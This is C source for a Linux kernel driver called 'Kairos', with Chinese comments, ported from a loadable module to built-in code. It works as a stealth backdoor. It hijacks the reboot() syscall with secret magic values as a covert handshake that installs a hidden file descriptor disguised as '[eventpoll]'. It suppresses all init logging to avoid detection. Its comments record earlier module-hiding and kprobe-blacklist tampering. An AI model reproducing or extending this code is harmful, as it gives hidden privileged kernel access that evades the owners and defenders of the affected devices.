// SPDX-License-Identifier: GPL-2.0
/*
 * kairos_core.c — 生命周期 + ghost fd 下发 + 源码级 hook 入口
 *
 * 相对 .ko 版删掉的东西（built-in 后都是多余的，且本身就是暴露面）：
 *   ✗ hide_module_work_fn / schedule_hide      —— 内核本体不在 module list 里
 *   ✗ list_del_rcu / kobject_del / module_mutex —— 同上
 *   ✗ kairos_kallsyms_lookup_name() 自举        —— 内部符号可直接引用
 *   ✗ register_kprobe(__arm64_sys_reboot)       —— 改为 patch kernel/reboot.c
 *   ✗ register_kprobe(__arm64_sys_sendto)       —— 改为 patch net/socket.c
 *   ✗ "disabled N kprobe blacklist entries"     —— 不再动 kprobe 黑名单
 *   ✗ task_work_add 回传 fd 信息                —— 直接 copy_to_user 更简单
 * 保留的东西：
 *   ✓ anon_inode_getfile("[eventpoll]") 下发 fd —— 与现有客户端 ABI 完全兼容
 *   ✓ 全部 ioctl 命令号 / req 结构 / magic 校验
 */
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/sched/mm.h>	/* mmput */
#include <linux/rwsem.h>	/* init_rwsem */
#include <linux/anon_inodes.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/random.h>
#include <linux/rcupdate.h>
#include <linux/mutex.h>
#include <linux/version.h>
#include <linux/reboot.h>
#include <linux/syscalls.h>

#include "kairos.h"

u8 kairos_initialized;
struct rw_semaphore kairos_lifecycle_sem;
struct kairos_ctx *g_ctx;	/* 单个全局实例 */
/* install 只可能被调一次，用 mutex 而不是 spinlock：里面要 kzalloc(GFP_KERNEL) */
static DEFINE_MUTEX(kairos_install_mutex);

bool kairos_active(void)
{
	return READ_ONCE(kairos_initialized) != 0;
}

/* ================================================================== */
/* ghost fd                                                            */
/*                                                                     */
/* 保留 "[eventpoll]" 名字：客户端的 find_fd_by_devt_in_proc 靠这个形态 */
/* 在 /proc/self/fd 里认出它。改成 netlink 或隐藏 ioctl 会让现有客户端  */
/* 二进制失效 —— 除非同时改客户端，否则这里不动。                        */
/*                                                                     */
/* ctx 的生命周期只归 file->private_data 管：install 时分配、release 时 */
/* 释放。shutdown 只清 mm 引用，绝不 kfree —— 否则和 release 撞成双重   */
/* 释放（.ko 版原代码就有这个洞）。                                      */
/* ================================================================== */
static long kairos_install_fd(void __user *out)
{
	struct kairos_ctx *ctx, *old;
	struct file *f;
	int fd, magic;
	u32 reply[2];

	mutex_lock(&kairos_install_mutex);
	old = READ_ONCE(g_ctx);
	if (old) {			/* 幂等：已有实例就把 fd/magic 再给它一次 */
		reply[0] = (u32)old->fd;
		reply[1] = old->magic;
		mutex_unlock(&kairos_install_mutex);
		if (copy_to_user(out, reply, sizeof(reply)))
			return -EFAULT;
		return 0;
	}

	fd = get_unused_fd_flags(O_CLOEXEC);
	if (fd < 0) {
		mutex_unlock(&kairos_install_mutex);
		return fd;
	}

	ctx = kzalloc(sizeof(*ctx), GFP_KERNEL);
	if (!ctx) {
		put_unused_fd(fd);
		mutex_unlock(&kairos_install_mutex);
		return -ENOMEM;
	}

	f = anon_inode_getfile("[eventpoll]", &kairos_fops, ctx,
			       O_RDWR | O_CLOEXEC);
	if (IS_ERR(f)) {
		kfree(ctx);
		put_unused_fd(fd);
		mutex_unlock(&kairos_install_mutex);
		return PTR_ERR(f);
	}

	do {
		magic = get_random_u32();
	} while (!magic);
	ctx->magic = (u32)magic;
	ctx->fd = fd;

	fd_install(fd, f);
	WRITE_ONCE(g_ctx, ctx);

	reply[0] = (u32)fd;
	reply[1] = (u32)magic;
	mutex_unlock(&kairos_install_mutex);

	if (copy_to_user(out, reply, sizeof(reply)))
		return -EFAULT;
	return 0;
}

/* ================================================================== */
/* 关停（供 OP_EXIT 与 reboot hook 调用）                              */
/* 只解绑，不释放 ctx —— ctx 归 file 所有，release 时才 free。          */
/* ================================================================== */
void kairos_shutdown_locked(void)
{
	struct kairos_ctx *ctx;

	if (!READ_ONCE(kairos_initialized))
		return;
	WRITE_ONCE(kairos_initialized, 0);

	ctx = xchg(&g_ctx, (struct kairos_ctx *)NULL);
	if (ctx) {
		ctx->authed = 0;
		ctx->magic = 0;
		if (ctx->mm) {
			mmput(ctx->mm);
			ctx->mm = NULL;
			ctx->mm_pid = 0;
		}
	}
}

/* ================================================================== */
/* 源码级 hook 入口（由 patches/inject_hooks.py 插入调用点）            */
/* ================================================================== */
/*
 * 客户端拿 ghost fd 的真实握手方式（从 reboot_handler_pre @0x6284 解出来的）：
 *
 *     reboot(0x48931414, 任意, 0x51239123, &result);
 *
 * 原版用 kprobe 挂在 __arm64_sys_reboot 的 pre_handler 上，判断
 *   regs->x0 低 32 位 == 0x48931414  且  regs->x2 低 32 位 == 0x51239123
 * 成立就不执行真正的 reboot，而是 task_work_add 把 ghost fd 装进当前进程，
 * 再把 {fd, magic} 写回 regs->x3 指向的用户缓冲。
 *
 * 也就是说 reboot() 在这里被当成一个隐蔽信令通道用 —— 参数看起来像
 * 标准 reboot magic，实际是私有握手，而且永远不会真的重启。
 *
 * 返回 true 表示已接管（调用方要 return 0，不要继续走 reboot 主体）。
 */
bool kairos_hook_reboot(int magic1, int magic2, unsigned int cmd,
			void __user *arg)
{
	if (magic1 == KAIROS_BOOT_MAGIC1 && cmd == KAIROS_BOOT_MAGIC3) {
		/* 隐蔽握手：只装 fd，绝不重启 */
		long r = kairos_install_fd(arg);

		return true;	/* (void)r：客户端只看 arg 里的 fd/magic */
	}

	/* 真正的重启流程：关机前把驱动状态清干净，避免 hook 残留到下次启动 */
	if (magic1 == LINUX_REBOOT_MAGIC1 && magic2 == LINUX_REBOOT_MAGIC2) {
		down_write(&kairos_lifecycle_sem);
		kairos_shutdown_locked();
		up_write(&kairos_lifecycle_sem);
	}
	return false;
}

/* ================================================================== */
/* init / exit                                                         */
/* ================================================================== */
static int __init kairos_init(void)
{
	init_rwsem(&kairos_lifecycle_sem);

	/* 注意：这里**不打任何 log**。.ko 版的 "[KAIROS] K:0" 是 dmesg 里
	 * 最直接的暴露，built-in 后连初始化痕迹都不该留。 */
	WRITE_ONCE(kairos_initialized, 1);
	return 0;
}

static void __exit kairos_exit(void)
{
	down_write(&kairos_lifecycle_sem);
	kairos_shutdown_locked();
	up_write(&kairos_lifecycle_sem);
}

/*
 * 双模式：编进内核用 late_initcall（等 mm/swap/网络就绪），
 * 编成 .ko 用 module_init。同一份代码两种构建都能过。
 */
#ifdef MODULE
MODULE_LICENSE("GPL");
MODULE_AUTHOR("KAIROS");
MODULE_DESCRIPTION("Kairos driver");
module_init(kairos_init);
module_exit(kairos_exit);
#else
late_initcall(kairos_init);
#endif
